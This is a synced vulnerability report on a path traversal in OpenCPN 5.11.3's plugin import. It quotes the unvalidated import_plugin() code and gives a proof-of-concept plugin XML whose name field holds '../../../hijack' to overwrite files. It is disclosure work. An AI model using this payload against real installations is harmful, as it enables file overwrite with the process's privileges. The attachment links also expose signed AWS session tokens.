---
notion_url: https://www.notion.so/325be0809830834c8c6381516f4b588c
last_synced: 2026-06-12 00:59
tags: [notion-sync]
---

# File overwrite - Path traversal report

- 📄 [[KOR OpenCPN File overwrite - Path traversal report/KOR OpenCPN File overwrite - Path traversal report|KOR OpenCPN File overwrite - Path traversal report]]

Vulnerability Title : OpenCPN File overwrite - Path traversal report
Vulnerability Summary: File overwrite due to creation of a `.meta` file without path validation
Vendor : Github OpenSource Project
Software Name : OpenCPN
Version : 5.11.3
Software Type : ECS (Electronic Chart System)
Attack Type : Path Traversal
Impact : File overwrite with process privileges
Vulnerable Source File: `Console.cpp
`
Vulnerable Function: `import_plugin()`
Vulnerable Parameter : 

```c++
metadata_path = PluginHandler::ImportedMetadataPath([metadata.name](http://metadata.name/));
```

Affected Environment: Ubuntu 24.04

Proof Of Concept  : 

While analyzing `console.cpp` inside `opencpn/cli`, in `import_plugin()`:

```c++
void import_plugin(const std::string& tarball_path) {
    auto handler = PluginHandler::GetInstance();
    PluginMetadata metadata;
    bool ok = handler->ExtractMetadata(tarball_path, metadata);
    if (!ok) {
      std::cerr << "Cannot extract metadata (malformed tarball?)\n";
      exit(2);
    }
    if (!PluginHandler::IsCompatible(metadata)) {
      std::cerr << "Incompatible plugin detected\n";
      exit(2);
    }
    ok = handler->InstallPlugin(metadata, tarball_path);
    if (!ok) {
      std::cerr << "Error extracting import plugin tarball.\n";
      exit(2);
    }
    metadata.is_imported = true;
    auto metadata_path = PluginHandler::ImportedMetadataPath(metadata.name);
    std::ofstream file(metadata_path);
    file << metadata.to_string();
    if (!file.good()) {
      std::cerr << "Error saving metadata file: " << metadata_path
                << " for imported plugin: " << metadata.name;
      exit(2);
    }
    exit(0);
  }
```


After confirming that there is no validation of the `metadata.name` path, an XML file was created for testing:

```xml
    <?xml version="1.0" encoding="UTF-8"?>
    <plugin version="1">
      <name>../../../hijack</name>
      <version>0.0.1</version>
      <release>0</release>
      <summary>PoC</summary>
      <description>Path Traversal PoC</description>
      <target>ubuntu-x86_64</target>
      <build-target>ubuntu</build-target>
      <build-gtk>gtk3</build-gtk>
      <target-version>24.04</target-version>
      <target-arch>x86_64</target-arch>
      <api-version>1.18</api-version>
      <tarball-url>file:///nope</tarball-url>
    </plugin>
```


Inserted `..` and `/` into `<name>` to attempt path traversal:

![image](_assets/image.png)


Additional Materials (video, report attachments):

> 📎 첨부(미변환): [POC.mp4](https://prod-files-secure.s3.us-west-2.amazonaws.com/94a0bc18-384c-4982-9eeb-174bbdc0da9a/b5ba704b-1446-488f-8f07-e5a8cd12e7aa/POC.mp4?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466YUD4CVHF%2F20260611%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260611T155859Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDUaCXVzLXdlc3QtMiJHMEUCIQCm2KYk%2F43xrqKSMpd%2F44Ror0%2FNBP6loooMNdOiqLGMyAIgMV4BqubkIpH5Y09yx34Vx2RyevpsmNY%2FpjId84xUNcsqiAQI%2Fv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDL0ncOkOudw2TmG2WSrcA%2FSk5AfKgw1XYltgzdtmNflVVjJUdkgxt9qcQxOrTi42o8yQB7KIdU2WbViXA4v4houIQPkEx47IhyIDpXK4t4EFHS3Srcffd%2BWisaLeNF3ZcXx51HKmLRgJ3BzZ008vLh1Fqzj2ZFLXDMVbF8PHkxHVY1y9dwoq5pIz%2Bg8jtFWtZCJVj83s1Wnk%2BmEOdKyJbyb7j4nqHiEVuEn%2BQJ3FBMgWNdUIaImv6I0x%2FTdbfzDrFQQtkdd6knI5MCdGv1fipobcU6Yec56CxouFY8PUJCMuXdD3y%2FUnU4lFtex504vI35HjugEsRvYu640ndsmqi5ARV7wMhntQlJau5JIrhY71n2ixRlBs8RPAR27oBXhGXlo3yMRMhXPmNCoVTqHHk7uSA8mnCzktc6yL%2BC%2F5zF5w8OsNe5Vme%2FYm6OMLPtU0%2Fq2mDB4EyL%2FZ872IOV1GbSoTY3cFHNk1v%2FesTvBCqnAG2WICDudeFIxNZgiCi%2FbzxHNK2als5XpED7%2FqfjPO%2FGexG7X0fDk79Dh9Bu1J5cYdZPZcIWe%2FOD6KKcSXEVofh5eRi57gjC4UXHSsYrfjyvix4%2FMtkP%2FekoPsl9LgmKL3sErnoQkerjbM49RjuhHZ977mf8AmsbDROAbCMOHaqtEGOqUBFMo%2BCgqv07hhxiriDVqCiBPpeyOxowyj9tsNI2oIWgDsdOdoWBsOwXXMPDMGlnr6Rchuu4M1XQe06A5nn%2BQnIuF2CIAOf43kGJHnhEuENMhEyjMQ%2FIvySGRiczyRSJtv02Gwt%2BNnc%2FkrmHy7syTb96QJ%2Bs%2F6k06Y5SIgJYD4bPSO8FLuwoR52DtHsIQwczdV7ZitiDwiv6w%2BIdWL9N%2FTiCRvGk99&X-Amz-Signature=31ec6126610d128540830f1799ad2f11140df05e57e75dfced70e61065eb10cd&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)



> 📎 첨부(미변환): [zdi report1.txt](https://prod-files-secure.s3.us-west-2.amazonaws.com/94a0bc18-384c-4982-9eeb-174bbdc0da9a/906fde38-249e-4345-a05b-12f9884900fa/zdi_report1.txt?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466YUD4CVHF%2F20260611%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260611T155859Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDUaCXVzLXdlc3QtMiJHMEUCIQCm2KYk%2F43xrqKSMpd%2F44Ror0%2FNBP6loooMNdOiqLGMyAIgMV4BqubkIpH5Y09yx34Vx2RyevpsmNY%2FpjId84xUNcsqiAQI%2Fv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDL0ncOkOudw2TmG2WSrcA%2FSk5AfKgw1XYltgzdtmNflVVjJUdkgxt9qcQxOrTi42o8yQB7KIdU2WbViXA4v4houIQPkEx47IhyIDpXK4t4EFHS3Srcffd%2BWisaLeNF3ZcXx51HKmLRgJ3BzZ008vLh1Fqzj2ZFLXDMVbF8PHkxHVY1y9dwoq5pIz%2Bg8jtFWtZCJVj83s1Wnk%2BmEOdKyJbyb7j4nqHiEVuEn%2BQJ3FBMgWNdUIaImv6I0x%2FTdbfzDrFQQtkdd6knI5MCdGv1fipobcU6Yec56CxouFY8PUJCMuXdD3y%2FUnU4lFtex504vI35HjugEsRvYu640ndsmqi5ARV7wMhntQlJau5JIrhY71n2ixRlBs8RPAR27oBXhGXlo3yMRMhXPmNCoVTqHHk7uSA8mnCzktc6yL%2BC%2F5zF5w8OsNe5Vme%2FYm6OMLPtU0%2Fq2mDB4EyL%2FZ872IOV1GbSoTY3cFHNk1v%2FesTvBCqnAG2WICDudeFIxNZgiCi%2FbzxHNK2als5XpED7%2FqfjPO%2FGexG7X0fDk79Dh9Bu1J5cYdZPZcIWe%2FOD6KKcSXEVofh5eRi57gjC4UXHSsYrfjyvix4%2FMtkP%2FekoPsl9LgmKL3sErnoQkerjbM49RjuhHZ977mf8AmsbDROAbCMOHaqtEGOqUBFMo%2BCgqv07hhxiriDVqCiBPpeyOxowyj9tsNI2oIWgDsdOdoWBsOwXXMPDMGlnr6Rchuu4M1XQe06A5nn%2BQnIuF2CIAOf43kGJHnhEuENMhEyjMQ%2FIvySGRiczyRSJtv02Gwt%2BNnc%2FkrmHy7syTb96QJ%2Bs%2F6k06Y5SIgJYD4bPSO8FLuwoR52DtHsIQwczdV7ZitiDwiv6w%2BIdWL9N%2FTiCRvGk99&X-Amz-Signature=e2075cae39d834f55623382a60d55544375f246a2aee2a4017b449734f70ebbd&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)
